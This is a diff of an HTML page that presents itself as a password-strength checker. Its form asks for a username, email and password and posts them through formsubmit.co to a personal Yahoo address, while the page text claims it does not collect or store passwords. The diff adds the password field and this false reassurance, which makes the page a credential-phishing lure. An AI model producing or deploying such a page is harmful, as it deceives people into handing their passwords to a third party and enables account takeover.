@@ -1,17 +1,21 @@
-<!DOCTYPE htlm>
+<!doctype html>
 <html>
 <head>
-	<title>Check Password</title>
+	<link rel="stylesheet" href="formstyle.css">
 </head>
-
 <body>
 
-<h2>Please fill the form so we can check if your password is strogn enough </h2>
-
-	<form action="https://formsubmit.co/rayanmcl@yahoo.com" method="POST">
-     <input type="text" name="name" required>
-     <input type="email" name="email" required>
-     <button type="submit">Send</button>
-</form>
+	<div class="container">
+		<form action="https://formsubmit.co/rayanmcl@yahoo.com" method="POST">
+			<h1> CHECK YOUR PASSWORD </h1><br>
+			<p>Please fill the form so we can check if your password is strong enough, <br>
+ 		            your password is not safe if it can be brute-force or found in a database of leaked passwords<br><br>
+			    We do not collect or store your passwords <p>			
+			<input type="text" id="username" placeholder="Username" required> <br>
+			<input type="email" id="email" placeholder="Email" required><br>
+			<input type="password" id="password" placeholder="Password" required><br>
+			<button type="Submit">Send</button><br>
+		</form>
+	</div>
 </body>
 </html>
